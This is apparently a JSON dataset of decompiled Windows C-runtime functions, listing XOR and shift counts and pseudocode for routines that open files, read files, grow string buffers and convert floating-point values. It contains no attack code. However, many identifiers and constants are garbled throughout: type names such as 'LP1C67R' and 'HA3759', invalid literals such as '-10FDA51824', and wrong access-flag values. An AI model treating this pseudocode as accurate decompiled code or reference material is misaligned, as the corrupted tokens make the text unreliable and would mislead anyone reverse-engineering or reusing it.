>= 0 );\n        }\n        else\n        {\n          v82 = 0;\n          v83 = 0;\n          v81 = 0x80741900;\n          v64 = dword_35270184 / 32;\n          v41 = dword_35270184 % 32;\n          v60 = dword_35270184 % 32;\n          v42 = ~(-1 << (dword_35270184 % 32));\n          v76 = 0;\n          v69 = 32 - dword_35270184 % 32;\n          do\n          {\n            v43 = *(&v81 + v5);\n            v44 = v43 >> v41;\n            LOCD9A(v41) = v60;\n            *(&v81 + v5++) = v76 | v44;\n            v76 = (v42 & v43) << v69;\n          }\n          while ( v5 < 3 );\n          v45 = &v83 - v64;\n          for ( j = 2; j >= 0; --j )\n          {\n            if ( j < v64 )\n              *(&v81 + j) = 0;\n            else\n              *(&v81 + j) = *v45;\n            --v45;\n          }\n          v6 = dword_35270178 + dword_3527018C;\n          v5 = 1;\n        }\n        goto LABEL_83;\n      }\n      v81 = v78;\n      v82 = v79;\n      v57 = (dword_3527017C - v71) / 32;\n      v83 = v80;\n      v19 = (dword_3527017C - v71) % 32;\n      v20 = v19;\n      v74 = 0;\n      v67 = ~(-1 << v19);\n      v59 = 32 - v19;\n      do\n      {\n        v21 = (v67 & *(&v81 + v5)) << v59;\n        v22 = v74 | ((unsigned int)*(&v81 + v5++) >> v20);\n        *(&v80 + v5) = v22;\n        v74 = v21;\n      }\n      while ( v5 < 3 );\n      v23 = &v83 - v57;\n      v24 = v57;\n      for ( k = 2; k >= 0; --k )\n      {\n        if ( k < v24 )\n        {\n          *(&v81 + k) = 0;\n        }\n        else\n        {\n          *(&v81 + k) = *v23;\n          v24 = v57;\n        }\n        --v23;\n      }\n      v26 = (v62 + 1) / 32;\n      v27 = 31 - (v62 + 1) % 32;\n      if ( ((1 << v27) & *(&v81 + v26)) != 0 )\n      {\n        for ( m = (~(-1 << v27) & *(&v81 + v26)) == 0; m; m = *(&v81 + v26) == 0 )\n        {\n          if ( ++v26 >= 3 )\n            goto LABEL_56;\n        }\n        v29 = *(&v81 + v62 / 32);\n        v30 = 0;\n        v72 = 1 << (31 - v62 % 32);\n        v12 = v29 + v72 < v29;\n        v31 = v29 + v72;\n        if ( v12 || v31 < v72 )\n          v30 = 1;\n        v32 = v62 / 32 - 1;\n        for ( *(&v82 + v32) = v31; v32 >= 0; *(&v82 + v32) = v34 )\n        {\n          if ( !v30 )\n            break;\n          v33 = *(&v81 + v32);\n          v30 = 0;\n          v12 = v33 + 1 < v33;\n          v34 = v33 + 1;\n          if ( v12 || !v34 )\n            v30 = 1;\n          --v32;\n        }\n        v27 = 31 - (v62 + 1) % 32;\nLABEL_56:\n        v26 = (v62 + 1) / 32;\n      }\n      *(&v81 + v26) &= -1 << v27;\n      v35 = v26 + 1;\n      if ( v35 < 3 )\n        memset(&v81 + v35, 0, 4 * (3 - v35));\n      v68 = (dword_35270184 + 1) / 32;\n      v36 = (dword_35270184 + 1) % 32;\n      v37 = 0;\n      v75 = 0;\n      v63 = 0;\n      do\n      {\n        v38 = *(&v81 + v37);\n        *(&v81 + v63) = v75 | (v38 >> v36);\n        v75 = (~(-1 << v36) & v38) << (32 - v36);\n        v37 = v63 + 1;\n        v63 = v37;\n      }\n      while ( v37 < 3 );\n      v39 = &v83 - v68;\n      for ( n = 2; n >= 0; --n )\n      {\n        if ( n < v68 )\n          *(&v81 + n) = 0;\n        else\n          *(&v81 + n) = *v39;\n        --v39;\n      }\n    }\n    else\n    {\n      v81 = 0;\n      v82 = 0;\n      v83 = 0;\n    }\n    v6 = 0;\n  }\n  v5 = 2;\nLABEL_83:\n  v4 = a2;\nLABEL_84:\n  v52 = v81 | (v55 != 0 ? 0x80741900 : 0) | (v6 << (31 - dword_35270184));\n  if ( dword_35270188 == 64 )\n  {\n    v53 = v82;\n    v4[1] = v52;\n    *v4 = v53;\n  }\n  else if ( dword_35270188 == 32 )\n  {\n    *v4 = v52;\n  }\n  return v5;\n}\n// 35270178: using guessed type int dword_35270178;\n// 3527017C: using guessed type int dword_3527017C;\n// 35270180: using guessed type int dword_35270180;\n// 35270184: using guessed type int dword_35270184;\n// 35270188: using guessed type int dword_35270188;\n// 3527018C: using guessed type int dword_3527018C;\n\n"
    },
    {
        "Function": "sub_3532E4A0",
        "Total XOR and shift operations": 23,
        "XOR operations": 2,
        "Shift operations": 21,
        "Operation percentage": "4.84%",
        "Function Body": "\nint __cdecl sub_3532E4A0(_DWORD *a1, int *a2, LP1C67R lpFileName, int a4, int a5, char a6)\n{\n  int v6; // ebx\n  DWORD v8; // edi\n  unsigned int v9; // eax\n  DWORD v10; // esi\n  int v11; // edx\n  int v12; // eax\n  int v13; // eax\n  int v14; // eax\n  void *v15; // eax\n  int v16; // eax\n  DWORD LastError; // eax\n  DWORD FileType; // eax\n  int v19; // eax\n  DWORD v20; // esi\n  char v21; // dl\n  int v22; // eax\n  int v23; // ecx\n  int v24; // ecx\n  int v25; // edx\n  int v26; // eax\n  int v27; // edx\n  int v28; // eax\n  DWORD v29; // eax\n  LONG HighPart; // ecx\n  __int64 v31; // rax\n  int v32; // eax\n  int v33; // edx\n  int v34; // eax\n  int v35; // eax\n  int v36; // edx\n  __int64 v37; // rax\n  int v38; // eax\n  int v39; // edx\n  LONG v40; // esi\n  int v41; // eax\n  int v42; // ecx\n  int v43; // edx\n  char v44; // cl\n  int v45; // eax\n  DWORD v46; // esi\n  int v47; // eax\n  DWORD v48; // eax\n  int v49; // eax\n  int v50; // [esp-10h] [ebp-50h]\n  int v51; // [esp-Ch] [ebp-4Ch]\n  int v52; // [esp-8h] [ebp-48h]\n  struct _SE1409TY_AT963FUTES SecurityAttributes; // [esp+8h] [ebp-38h] BYREF\n  LARGE_INF696R liDistanceToMove; // [esp+14h] [ebp-2Ch]\n  WCHAR WideCharStr[2]; // [esp+1Ch] [ebp-24h] BYREF\n  int v56; // [esp+20h] [ebp-20h] BYREF\n  HA3759 hObject; // [esp+24h] [ebp-1Ch]\n  int v58; // [esp+28h] [ebp-18h]\n  WCHAR v59[2]; // [esp+2Ch] [ebp-14h] BYREF\n  int v60; // [esp+30h] [ebp-10h]\n  DWORD dwShareMode; // [esp+34h] [ebp-Ch]\n  DWORD dwDesiredAccess; // [esp+38h] [ebp-8h]\n  char v63; // [esp+3Dh] [ebp-3h]\n  char v64; // [esp+3Eh] [ebp-2h]\n  char v65; // [esp+3Fh] [ebp-1h]\n\n  v6 = 0;\n  v56 = 0;\n  v64 = 0;\n  SecurityAttributes.nLength = 12;\n  SecurityAttributes.lpSecurityDescriptor = 0;\n  if ( (a4 & 0x80u) == 0 )\n  {\n    SecurityAttributes.bInheritHandle = 1;\n    v65 = 0;\n  }\n  else\n  {\n    SecurityAttributes.bInheritHandle = 0;\n    v65 = 16;\n  }\n  if ( sub_357EFB71(&v56) )\n    _invoke_watson(0, 0, 0, 0, 0);\n  if ( (a4 & 0x8000) == 0 && ((a4 & 0x74000) != 0 || v56 != 0x8000) )\n    v65 |= 0x80u;\n  if ( (a4 & 3) != 0 )\n  {\n    if ( (a4 & 3) == 1 )\n    {\n      if ( (a4 & 8) != 0 && (a4 & 0x70000) != 0 )\n      {\n        v8 = -10FDA51824;\n        dwDesiredAccess = -10FDA51824;\n        goto LABEL_20;\n      }\n      v8 = 0x405C5F00;\n    }\n    else\n    {\n      if ( (a4 & 3) != 2 )\n      {\n        *__doserrno() = 0;\n        *a2 = -1;\n        *_errno() = 22;\n        _invalid_parameter_noinfo();\n        return 22;\n      }\n      v8 = -10FDA51824;\n    }\n  }\n  else\n  {\n    v8 = 0x80741900;\n  }\n  dwDesiredAccess = v8;\nLABEL_20:\n  liDistanceToMove.HighPart = 2;\n  switch ( a5 )\n  {\n    case 16:\n      dwShareMode = 0;\n      break;\n    case 32:\n      dwShareMode = 1;\n      break;\n    case 48:\n      dwShareMode = 2;\n      break;\n    case 64:\n      dwShareMode = 3;\n      break;\n    case 128:\n      dwShareMode = v8 == 0x80741900;\n      break;\n    default:\n      goto LABEL_43;\n  }\n  v9 = a4 & 0x700;\n  if ( v9 > 0x400 )\n  {\n    if ( v9 != 1280 )\n    {\n      if ( v9 == 1536 )\n        goto LABEL_44;\n      if ( v9 != 1792 )\n        goto LABEL_43;\n    }\n    v10 = 1;\n    goto LABEL_46;\n  }\n  if ( v9 == 1024 || (a4 & 0x700) == 0 )\n  {\n    v52 = 3;\n    goto LABEL_39;\n  }\n  switch ( v9 )\n  {\n    case 0x100u:\n      v52 = 4;\nLABEL_39:\n      v10 = v52;\n      goto LABEL_46;\n    case 0x200u:\nLABEL_44:\n      v52 = 5;\n      goto LABEL_39;\n    case 0x300u:\n      v10 = 2;\nLABEL_46:\n      v11 = 128;\n      v12 = 0;\n      v58 = 128;\n      v60 = 0;\n      if ( (a4 & 0x100) != 0 )\n      {\n        v12 = 0;\n        if ( (a6 & ~(_BYTE)dword_358D057C & 0x80u) == 0 )\n        {\n          v11 = 1;\n          v58 = 1;\n        }\n      }\n      if ( (a4 & 0x40) != 0 )\n      {\n        dwShareMode |= 4u;\n        v12 = 0x405C5F0;\n        v60 = 0x405C5F0;\n        dwDesiredAccess = v8 | 0x10000;\n      }\n      if ( (a4 & 0x1000) != 0 )\n        v58 = v11 | 0x100;\n      if ( (a4 & 0x2000) != 0 )\n      {\n        v12 |= 0x2072C20u;\n        v60 = v12;\n      }\n      if ( (a4 & 0x20) != 0 )\n      {\n        v13 = v12 | 0x8074190;\n      }\n      else\n      {\n        if ( (a4 & 0x10) == 0 )\n          goto LABEL_60;\n        v13 = v12 | 0x1047B000;\n      }\n      v60 = v13;\nLABEL_60:\n      v14 = sub_35B922DB();\n      *a2 = v14;\n      if ( v14 == -1 )\n      {\n        *__doserrno() = 0;\n        *a2 = -1;\n        *_errno() = 24;\n        return *_errno();\n      }\n      v52 = v60;\n      v51 = v58;\n      *a1 = 1;\n      v15 = (void *)__createFile(lpFileName, dwDesiredAccess, dwShareMode, &SecurityAttributes, v10, v51, v52);\n      hObject = v15;\n      if ( v15 == (void *)-1 )\n      {\n        if ( (dwDesiredAccess & 0xC0C38800) != -10FDA51824\n          || (a4 & 1) == 0\n          || (dwDesiredAccess &= ~0x80741900,\n              v15 = (void *)__createFile(lpFileName, dwDesiredAccess, dwShareMode, &SecurityAttributes, v10, v58, v60),\n              hObject = v15,\n              v15 == (void *)-1) )\n        {\n          v16 = dword_35099EF0[*a2 >> 5];\n          *(_BYTE *)(v16 + ((*a2 & 0x1F) << 6) + 4) &= ~1u;\n          LastError = GetLastError();\n          _dosmaperr(LastError);\n          return *_errno();\n        }\n      }\n      FileType = GetFileType(v15);\n      switch ( FileType )\n      {\n        case 0u:\n          v19 = dword_35099EF0[*a2 >> 5];\n          *(_BYTE *)(v19 + ((*a2 & 0x1F) << 6) + 4) &= ~1u;\n          v20 = GetLastError();\n          _dosmaperr(v20);\n          CloseHandle(hObject);\n          if ( !v20 )\n            *_errno() = 13;\n          return *_errno();\n        case 2u:\n          v65 |= 0x40u;\n          break;\n        case 3u:\n          v65 |= 8u;\n          break;\n      }\n      _set_osfhnd(*a2, hObject);\n      v21 = v65 | 1;\n      *(_BYTE *)(dword_35099EF0[*a2 >> 5] + ((*a2 & 0x1F) << 6) + 4) = v65 | 1;\n      v22 = dword_35099EF0[*a2 >> 5];\n      v23 = (*a2 & 0x1F) << 6;\n      v65 = v21;\n      *(_BYTE *)(v22 + v23 + 36) &= 0x80u;\n      v24 = a4;\n      v63 = v21 & 0x48;\n      if ( (v21 & 0x48) == 0 )\n      {\n        if ( v21 >= 0 )\n          goto LABEL_135;\n        if ( (a4 & 2) != 0 )\n        {\n          liDistanceToMove.LowPart = _lseeki64_nolock(*a2, (LARGE_INF696R)-1i64, 2u);\n          *(_DWORD *)v59 = v25;\n          if ( (v25 & liDistanceToMove.LowPart) == -1 )\n          {\n            if ( *__doserrno() != 131 )\n            {\nLABEL_80:\n              _close_nolock(*a2);\n              return *_errno();\n            }\n          }\n          else\n          {\n            v50 = *a2;\n            *(_DWORD *)WideCharStr = 0;\n            if ( !sub_35FEABEE(v50, (CHAR *)WideCharStr, 1u)\n              && WideCharStr[0] == 26\n              && _chsize_nolock(*a2, (LARGE_INF696R)__PAC7DE__(*(unsigned int *)v59, liDistanceToMove.LowPart)) == -1 )\n            {\n              goto LABEL_80;\n            }\n            v26 = _lseeki64_nolock(*a2, 0i64, 0);\n            if ( (v27 & v26) == -1 )\n              goto LABEL_80;\n          }\n          v21 = v65;\n          v24 = a4;\n        }\n      }\n      if ( v21 >= 0 )\n      {\nLABEL_135:\n        v42 = dword_35099EF0[*a2 >> 5];\n        *(_BYTE *)(v42 + ((*a2 & 0x1F) << 6) + 36) ^= (v64 ^ *(_BYTE *)(v42 + ((*a2 & 0x1F) << 6) + 36)) & 0x7F;\n        v43 = dword_35099EF0[*a2 >> 5];\n        *(_BYTE *)(v43 + ((*a2 & 0x1F) << 6) + 36) = *(_BYTE *)(v43 + ((*a2 & 0x1F) << 6) + 36) & 0x7F | (BYTE2(a4) << 7);\n        v44 = a4;\n        if ( !v63 && (a4 & 8) != 0 )\n        {\n          v45 = dword_35099EF0[*a2 >> 5];\n          *(_BYTE *)(v45 + ((*a2 & 0x1F) << 6) + 4) |= 0x20u;\n          v44 = a4;\n        }\n        v46 = dwDesiredAccess;\n        if ( (dwDesiredAccess & 0xC0C38800) != -10FDA51824 || (v44 & 1) == 0 )\n          return v6;\n        CloseHandle(hObject);\n        v47 = __createFile(lpFileName, v46 & 0x7FF2EE8F, dwShareMode, &SecurityAttributes, 3u, v58, v60);\n        if ( v47 != -1 )\n        {\n          *(_DWORD *)(((*a2 & 0x1F) << 6) + dword_35099EF0[*a2 >> 5]) = v47;\n          return v6;\n        }\n        v48 = GetLastError();\n        _dosmaperr(v48);\n        v49 = dword_35099EF0[*a2 >> 5];\n        *(_BYTE *)(v49 + ((*a2 & 0x1F) << 6) + 4) &= ~1u;\n        _free_osfhnd(*a2);\n        return *_errno();\n      }\n      if ( (v24 & 0x74000) == 0 )\n      {\n        if ( (v56 & 0x74000) != 0 )\n          v24 |= v56 & 0x74000;\n        else\n          v24 |= 0x4000u;\n        a4 = v24;\n      }\n      v28 = v24 & 0x74000;\n      if ( (v24 & 0x74000) == 0x4000 )\n      {\n        v64 = 0;\n        goto LABEL_103;\n      }\n      if ( v28 == 0x10000 || v28 == 81920 )\n      {\n        if ( (v24 & 0x301) != 769 )\n          goto LABEL_103;\n      }\n      else if ( v28 != 0x20000 && v28 != 148868 )\n      {\n        if ( v28 == 0x40000 || v28 == 275DA8 )\n          v64 = 1;\nLABEL_103:\n        if ( (v24 & 0x70000) == 0 )\n          goto LABEL_135;\n        *(_DWORD *)v59 = 0;\n        if ( (v21 & 0x40) != 0 )\n          goto LABEL_135;\n        v29 = dwDesiredAccess & 0xC0C38800;\n        if ( (dwDesiredAccess & 0xC0C38800) == 0x405C5F00 )\n        {\n          HighPart = 2;\n          if ( v10 <= 2 || v10 > 4 )\n            goto LABEL_129;\n          LO456FD(v37) = _lseeki64_nolock(*a2, 0i64, 2u);\n          if ( v37 )\n            goto LABEL_126;\n        }\n        else\n        {\n          if ( v29 == 0x80741900 )\n          {\nLABEL_113:\n            v34 = sub_35FEABEE(*a2, (CHAR *)v59, 3u);\n            if ( v34 == -1 )\n              goto LABEL_80;\n            if ( v34 != 2 )\n            {\n              if ( v34 != 3 )\n                goto LABEL_126;\n              if ( *(_DWORD *)v59 == 12326087 )\n              {\n                v64 = 1;\n                goto LABEL_135;\n              }\n            }\n            if ( v59[0] == 65534 )\n            {\n              _close_nolock(*a2);\n              v6 = 22;\n              *_errno() = 22;\n              return v6;\n            }\n            if ( v59[0] == 65279 )\n            {\n              v35 = _lseeki64_nolock(*a2, (LARGE_INF696R)2i64, 0);\n              if ( (v36 & v35) == -1 )\n                goto LABEL_80;\n              v64 = 2;\n              goto LABEL_135;\n            }\nLABEL_126:\n            v38 = _lseeki64_nolock(*a2, 0i64, 0);\n            if ( (v39 & v38) == -1 )\n              goto LABEL_80;\n            goto LABEL_135;\n          }\n          if ( v29 != -10FDA51824 )\n            goto LABEL_135;\n          HighPart = 2;\n          if ( v10 <= 2 || v10 > 4 )\n            goto LABEL_129;\n          LO456FD(v31) = _lseeki64_nolock(*a2, 0i64, 2u);\n          if ( v31 )\n          {\n            v32 = _lseeki64_nolock(*a2, 0i64, 0);\n            if ( (v33 & v32) == -1 )\n              goto LABEL_80;\n            goto LABEL_113;\n          }\n        }\n        HighPart = 2;\nLABEL_129:\n        v40 = 0;\n        if ( v64 == 1 )\n        {\n          HighPart = 3;\n          *(_DWORD *)v59 = 12326087;\n          liDistanceToMove.HighPart = 3;\nLABEL_133:\n          while ( 1 )\n          {\n            v41 = sub_35BC7584(*a2, (char *)v59 + v40, HighPart - v40);\n            if ( v41 == -1 )\n              goto LABEL_80;\n            HighPart = liDistanceToMove.HighPart;\n            v40 += v41;\n            if ( liDistanceToMove.HighPart <= v40 )\n              goto LABEL_135;\n          }\n        }\n        if ( v64 == 2 )\n        {\n          wcscpy(v59, L\"\\uFEFF\");\n          goto LABEL_133;\n        }\n        goto LABEL_135;\n      }\n      v64 = 2;\n      goto LABEL_103;\n  }\nLABEL_43:\n  *__doserrno() = 0;\n  *a2 = -1;\n  v6 = 22;\n  *_errno() = 22;\n  _invalid_parameter_noinfo();\n  return v6;\n}\n// 351D5E75: conditional instruction was optimized away because esi.4 is in (1..5)\n// 351D5E8E: conditional instruction was optimized away because esi.4==5\n// 35E23253: conditional instruction was optimized away because esi.4 is in (1..5)\n// 3511C34D: variable 'v25' is possibly undefined\n// 3511C3AB: variable 'v27' is possibly undefined\n// 351D5EA8: variable 'v31' is possibly undefined\n// 351D5EB8: variable 'v33' is possibly undefined\n// 35E2323A: variable 'v36' is possibly undefined\n// 35E23278: variable 'v37' is possibly undefined\n// 35E23284: variable 'v39' is possibly undefined\n// 3559E6C5: using guessed type _DWORD __cdecl _dosmaperr(_DWORD);\n// 35154780: using guessed type _DWORD __cdecl _free_osfhnd(_DWORD);\n// 358D057C: using guessed type int dword_358D057C;\n// 35099EF0: using guessed type int dword_35099EF0[64];\n\n"
    },
    {
        "Function": "sub_354CE310",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "2.73%",
        "Function Body": "\nint __thiscall sub_354CE310(void **this, int a2, size_t Size)\n{\n  int result; // eax\n  _DWORD v4[12]; // [esp+0h] [ebp-90h] BYREF\n  void *v5; // [esp+30h] [ebp-60h]\n  void **v6; // [esp+34h] [ebp-5Ch]\n  void *v7; // [esp+38h] [ebp-58h]\n  int v8; // [esp+3Ch] [ebp-54h]\n  int v9; // [esp+40h] [ebp-50h]\n  int v10; // [esp+44h] [ebp-4Ch]\n  int v11; // [esp+48h] [ebp-48h]\n  int v12; // [esp+4Ch] [ebp-44h]\n  int v13; // [esp+50h] [ebp-40h]\n  void **v14; // [esp+54h] [ebp-3Ch]\n  void **v15; // [esp+58h] [ebp-38h]\n  void *v16; // [esp+5Ch] [ebp-34h]\n  void *Src; // [esp+60h] [ebp-30h]\n  void *v18; // [esp+6Ch] [ebp-24h]\n  size_t v19; // [esp+70h] [ebp-20h]\n  unsigned int v20; // [esp+74h] [ebp-1Ch]\n  void **v21; // [esp+78h] [ebp-18h]\n  char v22; // [esp+7Fh] [ebp-11h]\n  _DWORD *v23; // [esp+80h] [ebp-10h]\n  int v24; // [esp+8Ch] [ebp-4h]\n\n  v23 = v4;\n  v21 = this;\n  v20 = a2 | 0xF;\n  v13 = -1;\n  v12 = -2;\n  if ( (a2 | 0xF) == -1 )\n  {\n    v20 = a2;\n  }\n  else if ( (unsigned int)v21[5] >> 1 > v20 / 3 )\n  {\n    v11 = -1;\n    v10 = -2;\n    if ( (unsigned int)v21[5] > -2 - ((unsigned int)v21[5] >> 1) )\n    {\n      v9 = -1;\n      v8 = -2;\n      v20 = -2;\n    }\n    else\n    {\n      v20 = (unsigned int)v21[5] + ((unsigned int)v21[5] >> 1);\n    }\n  }\n  v24 = 0;\n  v19 = v20 + 1;\n  v18 = 0;\n  if ( v20 != -1 )\n  {\n    v5 = operator new(v19);\n    v18 = v5;\n    if ( !v5 )\n      unknown_libname_3();\n  }\n  v4[11] = v18;\n  v16 = v18;\n  v24 = -1;\n  if ( Size )\n  {\n    if ( (unsigned int)v21[5] < 0x10 )\n    {\n      Src = v21;\n    }\n    else\n    {\n      Src = (void *)v4[6];\n      Src = *v21;\n    }\n    v7 = v16;\n    v4[8] = memmove_0(v16, Src, Size);\n  }\n  sub_356FDD30(v21, 1, 0);\n  v4[7] = v21;\n  v15 = v21;\n  if ( v21 )\n  {\n    *v15 = v16;\n    v6 = v15;\n  }\n  else\n  {\n    v6 = 0;\n  }\n  v4[5] = v6;\n  v21[5] = (void *)v20;\n  v22 = 0;\n  v21[4] = (void *)Size;\n  if ( (unsigned int)v21[5] < 0x10 )\n  {\n    v14 = v21;\n  }\n  else\n  {\n    v14 = (void **)v4[4];\n    v14 = (void **)*v21;\n  }\n  result = (int)v14 + Size;\n  *((_BYTE *)v14 + Size) = v22;\n  return result;\n}\n// 356DA11F: conditional instruction was optimized away because %Size.4!=0\n// 354776AC: using guessed type void __noreturn unknown_libname_3(void);\n\n"
    },
    {
        "Function": "sub_35FEABEE",
        "Total XOR and shift operations": 14,
        "XOR operations": 0,
        "Shift operations": 14,
        "Operation percentage": "2.45%",
        "Function Body": "\nint __cdecl sub_35FEABEE(int FileHandle, CHAR *lpWideCharStr, DWORD nNumberOfBytesToRead)\n{\n  DWORD v3; // esi\n  signed int v4; // edi\n  int v5; // ecx\n  int v6; // edx\n  int v7; // ebx\n  char v8; // al\n  CHAR *v9; // eax\n  int v10; // eax\n  int v11; // ecx\n  int v12; // edx\n  int v13; // edx\n  int v14; // ecx\n  bool v15; // zf\n  CHAR v16; // dl\n  _BYTE *v17; // edx\n  int v18; // eax\n  char v19; // al\n  int v20; // eax\n  _BYTE *v21; // edx\n  char v22; // al\n  int v23; // eax\n  int v24; // eax\n  int v25; // ecx\n  DWORD LastError; // eax\n  int v27; // ebx\n  CHAR *v28; // eax\n  DWORD v29; // ecx\n  int v30; // edx\n  int v31; // esi\n  char v32; // al\n  char v33; // al\n  CHAR *v34; // esi\n  LPCCH v35; // edi\n  char v36; // al\n  int v37; // ecx\n  char v38; // al\n  CHAR *v39; // esi\n  int v40; // edx\n  int v41; // ecx\n  char v42; // al\n  _BYTE *v43; // esi\n  int v44; // eax\n  int v45; // esi\n  BOOL v46; // ecx\n  CHAR *v48; // esi\n  LPCCH v49; // ecx\n  const CHAR *v50; // edx\n  __int16 v51; // ax\n  __int16 v52; // ax\n  char v53; // al\n  CHAR *v54; // esi\n  LPCCH v55; // edi\n  __int16 v56; // ax\n  int v57; // ecx\n  char v58; // al\n  DWORD Mode; // [esp+14h] [ebp-20h] BYREF\n  LP3C2F lpBuffer; // [esp+18h] [ebp-1Ch]\n  int v62; // [esp+1Ch] [ebp-18h]\n  DWORD NumberOfCharsRead; // [esp+20h] [ebp-14h] BYREF\n  LPCCH lpMultiByteStr; // [esp+24h] [ebp-10h]\n  int v65; // [esp+28h] [ebp-Ch]\n  __int16 v66; // [esp+2Ch] [ebp-8h] BYREF\n  char Buffer; // [esp+33h] [ebp-1h] BYREF\n  char nNumberOfBytesToRead_3; // [esp+47h] [ebp+13h]\n\n  v3 = nNumberOfBytesToRead;\n  v4 = 0;\n  Mode = 0;\n  v62 = -2;\n  if ( FileHandle == -2 )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    return -1;\n  }\n  if ( FileHandle < 0\n    || FileHandle >= (unsigned int)dword_35E83660\n    || (v5 = FileHandle >> 5,\n        v6 = dword_35099EF0[FileHandle >> 5],\n        v7 = (FileHandle & 0x1F) << 6,\n        v65 = FileHandle >> 5,\n        v8 = *(_BYTE *)(v6 + v7 + 4),\n        (v8 & 1) == 0) )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    goto LABEL_163;\n  }\n  if ( nNumberOfBytesToRead > 0x7FF2EE8F )\n    goto LABEL_7;\n  if ( !nNumberOfBytesToRead || (v8 & 2) != 0 )\n    return 0;\n  if ( !lpWideCharStr )\n  {\nLABEL_7:\n    *__doserrno() = 0;\n    *_errno() = 22;\nLABEL_163:\n    _invalid_parameter_noinfo();\n    return -1;\n  }\n  nNumberOfBytesToRead_3 = (char)(2 * *(_BYTE *)(v6 + v7 + 36)) >> 1;\n  if ( nNumberOfBytesToRead_3 == 1 )\n  {\n    if ( (v3 & 1) != 0 )\n      goto LABEL_7;\n    v3 >>= 1;\n    if ( v3 < 4 )\n      v3 = 4;\n    lpMultiByteStr = (LPCCH)_malloc_crt(v3);\n    if ( !lpMultiByteStr )\n    {\n      *_errno() = 12;\n      *__doserrno() = 8;\n      return -1;\n    }\n    v10 = _lseeki64_nolock(FileHandle, 0i64, 1u);\n    v11 = dword_35099EF0[v65];\n    *(_DWORD *)(v11 + v7 + 40) = v10;\n    v9 = (CHAR *)lpMultiByteStr;\n    *(_DWORD *)(v11 + v7 + 44) = v12;\n    v5 = v65;\n  }\n  else\n  {\n    if ( nNumberOfBytesToRead_3 == 2 )\n    {\n      if ( (v3 & 1) != 0 )\n        goto LABEL_7;\n      v3 &= ~1u;\n    }\n    v9 = lpWideCharStr;\n    lpMultiByteStr = lpWideCharStr;\n  }\n  v13 = dword_35099EF0[v5];\n  v14 = v65;\n  v15 = (*(_BYTE *)(v13 + v7 + 4) & 0x48) == 0;\n  lpBuffer = v9;\n  if ( !v15 )\n  {\n    v16 = *(_BYTE *)(v13 + v7 + 5);\n    if ( v16 != 10 )\n    {\n      if ( v3 )\n      {\n        *v9 = v16;\n        v17 = v9 + 1;\n        v18 = dword_35099EF0[v14];\n        v4 = 1;\n        --v3;\n        lpBuffer = v17;\n        *(_BYTE *)(v18 + v7 + 5) = 10;\n        if ( nNumberOfBytesToRead_3 )\n        {\n          v19 = *(_BYTE *)(dword_35099EF0[v14] + v7 + 37);\n          if ( v19 != 10 )\n          {\n            if ( v3 )\n            {\n              *v17 = v19;\n              v20 = dword_35099EF0[v14];\n              v21 = v17 + 1;\n              --v3;\n              lpBuffer = v21;\n              v4 = 2;\n              *(_BYTE *)(v20 + v7 + 37) = 10;\n              if ( nNumberOfBytesToRead_3 == 1 )\n              {\n                v22 = *(_BYTE *)(dword_35099EF0[v14] + v7 + 38);\n                if ( v22 != 10 )\n                {\n                  if ( v3 )\n                  {\n                    v4 = 3;\n                    *v21 = v22;\n                    v23 = dword_35099EF0[v14];\n                    lpBuffer = v21 + 1;\n                    --v3;\n                    *(_BYTE *)(v23 + v7 + 38) = 10;\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n  v15 = _isatty(FileHandle) == 0;\n  v24 = v65;\n  if ( v15 || (v25 = dword_35099EF0[v65], *(char *)(v25 + v7 + 4) >= 0) )\n  {\nLABEL_44:\n    if ( !ReadFile(*(HA3759 *)(dword_35099EF0[v24] + ((FileHandle & 0x1F) << 6)), lpBuffer, v3, &NumberOfCharsRead, 0)\n      || (v29 = NumberOfCharsRead, (NumberOfCharsRead & 0x80741900) != 0)\n      || NumberOfCharsRead > v3 )\n    {\n      LastError = GetLastError();\n      if ( LastError == 5 )\n      {\n        *_errno() = 9;\n        *__doserrno() = 5;\n        goto LABEL_40;\n      }\n      if ( LastError == 109 )\n      {\n        v27 = 0;\n        goto LABEL_41;\n      }\n      goto LABEL_39;\n    }\n    goto LABEL_47;\n  }\n  Mode = GetConsoleMode(*(HA3759 *)(v25 + ((FileHandle & 0x1F) << 6)), &Mode);\n  if ( !Mode || nNumberOfBytesToRead_3 != 2 )\n  {\n    v24 = v65;\n    goto LABEL_44;\n  }\n  if ( ReadConsoleW(\n         *(HA3759 *)(dword_35099EF0[v65] + ((FileHandle & 0x1F) << 6)),\n         lpBuffer,\n         v3 >> 1,\n         &NumberOfCharsRead,\n         0) )\n  {\n    v29 = 2 * NumberOfCharsRead;\n    NumberOfCharsRead *= 2;\nLABEL_47:\n    v30 = v65;\n    v4 += v29;\n    v31 = dword_35099EF0[v65];\n    v32 = *(_BYTE *)(v31 + v7 + 4);\n    if ( v32 >= 0 )\n      goto LABEL_103;\n    if ( nNumberOfBytesToRead_3 != 2 )\n    {\n      if ( v29 && *lpMultiByteStr == 10 )\n        v33 = v32 | 4;\n      else\n        v33 = v32 & 0xFB;\n      *(_BYTE *)(v31 + v7 + 4) = v33;\n      v34 = (CHAR *)lpMultiByteStr;\n      Mode = (DWORD)lpMultiByteStr;\n      lpBuffer = (LP3C2F)&lpMultiByteStr[v4];\n      if ( lpMultiByteStr < &lpMultiByteStr[v4] )\n      {\n        v35 = lpMultiByteStr;\n        do\n        {\n          v36 = *v35;\n          if ( *v35 == 26 )\n          {\n            v37 = dword_35099EF0[v30];\n            v38 = *(_BYTE *)(v37 + v7 + 4);\n            if ( (v38 & 0x40) != 0 )\n              *v34++ = *v35;\n            else\n              *(_BYTE *)(v37 + v7 + 4) = v38 | 2;\n            break;\n          }\n          if ( v36 == 13 )\n          {\n            if ( v35 >= (char *)lpBuffer - 1 )\n            {\n              ++v35;\n              if ( !ReadFile(\n                      *(HA3759 *)(dword_35099EF0[v30] + ((FileHandle & 0x1F) << 6)),\n                      &Buffer,\n                      1u,\n                      &NumberOfCharsRead,\n                      0)\n                && GetLastError()\n                || !NumberOfCharsRead )\n              {\n                v30 = v65;\n                *v34++ = 13;\n                continue;\n              }\n              v30 = v65;\n              if ( (*(_BYTE *)(dword_35099EF0[v65] + v7 + 4) & 0x48) != 0 )\n              {\n                if ( Buffer == 10 )\n                {\n                  *v34++ = 10;\n                }\n                else\n                {\n                  *v34++ = 13;\n                  *(_BYTE *)(dword_35099EF0[v30] + v7 + 5) = 